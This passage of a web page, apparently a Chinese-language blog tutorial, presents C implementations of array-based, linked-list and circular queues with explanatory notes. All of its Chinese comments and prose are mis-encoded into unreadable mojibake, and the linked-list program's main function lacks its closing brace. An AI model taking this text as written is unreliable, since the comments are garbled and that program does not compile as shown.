class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©º\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = queue-&gt;front; i &lt; queue-&gt;rear; i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, queue-&gt;data[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = <span class="hljs-built_in">InitQueue</span>(); <span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><br>    <span class="hljs-comment">// å…¥é˜Ÿä¸€äº›å…ƒç´ </span><br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// å‡ºé˜Ÿä¸€ä¸ªå…ƒç´ </span><br>    <span class="hljs-type">int</span> dequeuedValue = <span class="hljs-built_in">Dequeue</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿçš„å…ƒç´ ä¸ºï¼š%d\n&quot;</span>, dequeuedValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿåé˜Ÿåˆ—å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </span><br>    <span class="hljs-type">int</span> frontValue = <span class="hljs-built_in">GetFront</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ä¸ºï¼š%d\n&quot;</span>, frontValue);<br><br>    <span class="hljs-comment">// é‡Šæ”¾é˜Ÿåˆ—å†…å­˜</span><br>    <span class="hljs-built_in">free</span>(queue);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å…³é”®ç‚¹ï¼š</strong></p><ul><li><p><strong>å®šä¹‰ç»“æ„ä½“ Queue</strong>ï¼š</p><ul><li><code>int data[MAX_SIZE];</code> ç”¨æ•°ç»„å­˜å‚¨é˜Ÿåˆ—å…ƒç´ ï¼Œ<code>MAX_SIZE</code> ä¸ºé˜Ÿåˆ—çš„æœ€å¤§å®¹é‡ã€‚</li><li><code>int front;</code> è¡¨ç¤ºé˜Ÿåˆ—å¤´éƒ¨çš„ç´¢å¼•ã€‚</li><li><code>int rear;</code> è¡¨ç¤ºé˜Ÿåˆ—å°¾éƒ¨çš„ç´¢å¼•ã€‚</li></ul><p><strong>åˆå§‹åŒ–é˜Ÿåˆ—</strong>ï¼š</p><ul><li><code>InitQueue()</code> åˆå§‹åŒ–é˜Ÿåˆ—ï¼Œ<code>front</code> å’Œ <code>rear</code> éƒ½è®¾ä¸º 0ï¼Œè¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©ºã€‚</li></ul><p><strong>åˆ¤æ–­é˜Ÿåˆ—çŠ¶æ€</strong>ï¼š</p><ul><li><code>IsEmpty(queue)</code> åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©ºï¼š<code>front == rear</code> è¡¨ç¤ºé˜Ÿåˆ—ä¸ºç©ºã€‚</li><li><code>IsFull(queue)</code> åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ï¼š<code>rear == MAX_SIZE</code> è¡¨ç¤ºé˜Ÿåˆ—æ»¡ã€‚</li></ul><p><strong>å…¥é˜Ÿæ“ä½œï¼ˆEnqueueï¼‰</strong>ï¼š</p><ul><li><code>Enqueue(queue, value)</code> å‘é˜Ÿåˆ—æœ«å°¾æ’å…¥æ–°å…ƒç´ ï¼Œå°†æ–°å€¼å­˜å‚¨åœ¨ <code>data[rear]</code>ï¼Œç„¶å <code>rear++</code>ã€‚</li></ul><p><strong>å‡ºé˜Ÿæ“ä½œï¼ˆDequeueï¼‰</strong>ï¼š</p><ul><li><code>Dequeue(queue)</code> åˆ é™¤é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ï¼Œä»é˜Ÿåˆ—å¤´éƒ¨ç§»é™¤å…ƒç´ ï¼Œè¿”å› <code>data[front]</code> çš„å€¼ï¼Œç„¶å <code>front++</code>ã€‚</li></ul><p><strong>è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </strong>ï¼š</p><ul><li><code>GetFront(queue)</code> è¿”å›é˜Ÿåˆ—å¤´éƒ¨çš„å…ƒç´ ï¼Œä¸æ”¹å˜é˜Ÿåˆ—ç»“æ„ã€‚</li></ul><p><strong>æ‰“å°é˜Ÿåˆ—å†…å®¹</strong>ï¼š</p><ul><li><code>PrintQueue(queue)</code> ä» <code>front</code> åˆ° <code>rear</code> æ‰“å°é˜Ÿåˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ ã€‚</li></ul></li></ul><h4 id="é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨"><a href="#é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨" class="headerlink" title="é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨"></a>é˜Ÿåˆ—çš„é“¾å¼å­˜å‚¨</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-comment">// å®šä¹‰é“¾è¡¨èŠ‚ç‚¹</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> &#123;<br>    <span class="hljs-type">int</span> data;           <span class="hljs-comment">// å­˜å‚¨æ•°æ®</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *next;  <span class="hljs-comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ</span><br>&#125; Node;<br><br><span class="hljs-comment">// å®šä¹‰é“¾è¡¨é˜Ÿåˆ—ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Queue</span> &#123;<br>    Node *front;  <span class="hljs-comment">// é˜Ÿåˆ—å¤´æŒ‡é’ˆ</span><br>    Node *rear;   <span class="hljs-comment">// é˜Ÿåˆ—å°¾æŒ‡é’ˆ</span><br>&#125; Queue;<br><br><span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><span class="hljs-function">Queue* <span class="hljs-title">InitQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (queue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    queue-&gt;front = <span class="hljs-literal">NULL</span>;<br>    queue-&gt;rear = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> queue;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;front == <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *queue, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    Node *newNode = (Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Node)); <span class="hljs-comment">// åˆ›å»ºæ–°èŠ‚ç‚¹</span><br>    <span class="hljs-keyword">if</span> (newNode == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    newNode-&gt;data = value;<br>    newNode-&gt;next = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        queue-&gt;front = newNode;<br>        queue-&gt;rear = newNode;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        queue-&gt;rear-&gt;next = newNode;<br>        queue-&gt;rear = newNode;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•åˆ é™¤å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    Node *temp = queue-&gt;front;<br>    <span class="hljs-type">int</span> value = temp-&gt;data;<br>    queue-&gt;front = queue-&gt;front-&gt;next;<br>    <span class="hljs-keyword">if</span> (queue-&gt;front == <span class="hljs-literal">NULL</span>) &#123;<br>        queue-&gt;rear = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// å¦‚æœé˜Ÿåˆ—å˜ç©ºï¼Œæ›´æ–°å°¾æŒ‡é’ˆ</span><br>    &#125;<br>    <span class="hljs-built_in">free</span>(temp);<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFront</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•è·å–å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> queue-&gt;front-&gt;data;<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—å†…å®¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintQueue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©º\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Node *p = queue-&gt;front;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = <span class="hljs-built_in">InitQueue</span>(); <span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><br>    <span class="hljs-comment">// å…¥é˜Ÿä¸€äº›å…ƒç´ </span><br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// å‡ºé˜Ÿä¸€ä¸ªå…ƒç´ </span><br>    <span class="hljs-type">int</span> dequeuedValue = <span class="hljs-built_in">Dequeue</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿçš„å…ƒç´ ä¸ºï¼š%d\n&quot;</span>, dequeuedValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿåé˜Ÿåˆ—å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </span><br>    <span class="hljs-type">int</span> frontValue = <span class="hljs-built_in">GetFront</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ä¸ºï¼š%d\n&quot;</span>, frontValue);<br><br>    <span class="hljs-comment">// é‡Šæ”¾é˜Ÿåˆ—å†…å­˜</span><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">Dequeue</span>(queue);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(queue);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h4 id="å¾ªç¯é˜Ÿåˆ—"><a href="#å¾ªç¯é˜Ÿåˆ—" class="headerlink" title="å¾ªç¯é˜Ÿåˆ—"></a>å¾ªç¯é˜Ÿåˆ—</h4><p>å¾ªç¯é˜Ÿåˆ—æ˜¯é˜Ÿåˆ—çš„ä¸€ç§å˜å½¢ï¼Œå®ƒä½¿ç”¨æ•°ç»„å®ç°ï¼Œå¹¶é€šè¿‡å°†é˜Ÿå°¾æŒ‡é’ˆå’Œé˜Ÿå¤´æŒ‡é’ˆè¿›è¡Œâ€œç¯ç»•â€å¤„ç†ï¼Œä»¥æœ‰æ•ˆåˆ©ç”¨æ•°ç»„ç©ºé—´ã€‚ä»¥ä¸‹æ˜¯å¾ªç¯é˜Ÿåˆ—çš„è¿›é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œã€‚æŠŠå­˜å‚¨é˜Ÿåˆ—å…ƒç´ çš„è¡¨ä»é€»è¾‘ä¸Šè§†ä¸ºä¸€ä¸ªç¯ã€‚</p><p><code>rear</code> æŒ‡é’ˆæ€»æ˜¯æŒ‡å‘ä¸€ä¸ªç©ºä½ç½®<strong>ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå¾ªç¯é˜Ÿåˆ—æ€»ä¼šæœ‰ä¸€ä¸ªç©ºä½ç½®çš„åŸå› ã€‚è¿™ä¸ªè®¾è®¡ç›®çš„æ˜¯ä¸ºäº†åŒºåˆ†</strong>é˜Ÿåˆ—ä¸ºç©º<strong>å’Œ</strong>é˜Ÿåˆ—å·²æ»¡**çš„çŠ¶æ€ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_SIZE 100 <span class="hljs-comment">// é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡</span></span><br><br><span class="hljs-comment">// å®šä¹‰å¾ªç¯é˜Ÿåˆ—ç»“æ„</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Queue</span> &#123;<br>    <span class="hljs-type">int</span> data[MAX_SIZE]; <span class="hljs-comment">// ç”¨æ•°ç»„å­˜å‚¨é˜Ÿåˆ—å…ƒç´ </span><br>    <span class="hljs-type">int</span> front;          <span class="hljs-comment">// é˜Ÿåˆ—å¤´ç´¢å¼•</span><br>    <span class="hljs-type">int</span> rear;           <span class="hljs-comment">// é˜Ÿåˆ—å°¾ç´¢å¼•</span><br>&#125; Queue;<br><br><span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><span class="hljs-function">Queue* <span class="hljs-title">InitQueue</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = (Queue*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Queue));<br>    <span class="hljs-keyword">if</span> (queue == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å†…å­˜åˆ†é…å¤±è´¥\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    queue-&gt;front = <span class="hljs-number">0</span>;<br>    queue-&gt;rear = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> queue;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsEmpty</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> queue-&gt;front == queue-&gt;rear;<br>&#125;<br><br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦å·²æ»¡</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">IsFull</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (queue-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE == queue-&gt;front;<br>&#125;<br><br><span class="hljs-comment">// å…¥é˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Enqueue</span><span class="hljs-params">(Queue *queue, <span class="hljs-type">int</span> value)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsFull</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å·²æ»¡ï¼Œæ— æ³•æ’å…¥å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    queue-&gt;data[queue-&gt;rear] = value;<br>    queue-&gt;rear = (queue-&gt;rear + <span class="hljs-number">1</span>) % MAX_SIZE;<br>&#125;<br><br><span class="hljs-comment">// å‡ºé˜Ÿæ“ä½œ</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">Dequeue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•åˆ é™¤å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-type">int</span> value = queue-&gt;data[queue-&gt;front];<br>    queue-&gt;front = (queue-&gt;front + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br><br><span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetFront</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©ºï¼Œæ— æ³•è·å–å…ƒç´ \n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> queue-&gt;data[queue-&gt;front];<br>&#125;<br><br><span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—å†…å®¹</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PrintQueue</span><span class="hljs-params">(Queue *queue)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IsEmpty</span>(queue)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—ä¸ºç©º\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> i = queue-&gt;front;<br>    <span class="hljs-keyword">while</span> (i != queue-&gt;rear) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d -&gt; &quot;</span>, queue-&gt;data[i]);<br>        i = (i + <span class="hljs-number">1</span>) % MAX_SIZE;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NULL\n&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    Queue *queue = <span class="hljs-built_in">InitQueue</span>(); <span class="hljs-comment">// åˆå§‹åŒ–é˜Ÿåˆ—</span><br><br>    <span class="hljs-comment">// å…¥é˜Ÿä¸€äº›å…ƒç´ </span><br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">20</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">30</span>);<br>    <span class="hljs-built_in">Enqueue</span>(queue, <span class="hljs-number">40</span>);<br><br>    <span class="hljs-comment">// æ‰“å°é˜Ÿåˆ—å†…å®¹</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// å‡ºé˜Ÿä¸€ä¸ªå…ƒç´ </span><br>    <span class="hljs-type">int</span> dequeuedValue = <span class="hljs-built_in">Dequeue</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿçš„å…ƒç´ ä¸ºï¼š%d\n&quot;</span>, dequeuedValue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;å‡ºé˜Ÿåé˜Ÿåˆ—å†…å®¹ä¸ºï¼š&quot;</span>);<br>    <span class="hljs-built_in">PrintQueue</span>(queue);<br><br>    <span class="hljs-comment">// è·å–é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ </span><br>    <span class="hljs-type">int</span> frontValue = <span class="hljs-built_in">GetFront</span>(queue);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;é˜Ÿåˆ—å¤´éƒ¨å…ƒç´ ä¸ºï¼š%d\n&quot;</span>, frontValue);<br><br>    <span class="hljs-comment">// é‡Šæ”¾é˜Ÿåˆ—å†…å­˜</span><br>    <span class="hljs-built_in">free</span>(queue);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 